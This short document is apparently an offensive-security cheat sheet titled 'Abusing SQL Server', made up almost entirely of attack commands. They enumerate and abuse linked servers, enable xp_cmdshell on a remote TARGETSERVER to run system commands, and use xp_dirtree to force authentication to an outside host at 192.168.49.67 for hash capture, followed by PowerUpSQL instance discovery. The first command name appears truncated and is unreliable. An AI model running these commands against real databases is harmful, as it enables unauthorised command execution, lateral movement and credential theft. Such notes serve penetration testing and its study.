# 🟢 Abusing SQL Server

### Using SQL Commands

```
EXEC sp_linkedserversco
```

```
select mylogin from openquery("TARGETSERVER", 'select SYSTEM_USER as mylogin')
```

```
EXEC ('sp_configure ''show advanced options'', 1; reconfigure') AT TARGETSERVER
```

```
EXEC ('sp_configure ''xp_cmdshell'', 1; reconfigure') AT TARGETSERVER
```

```
EXEC ('xp_cmdshell ''whoami'' ') AT TARGETSERVER
```

```
EXEC master..xp_dirtree "\\192.168.49.67\share"
```

### Using PowerUpSQL

```
Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded | ft
```
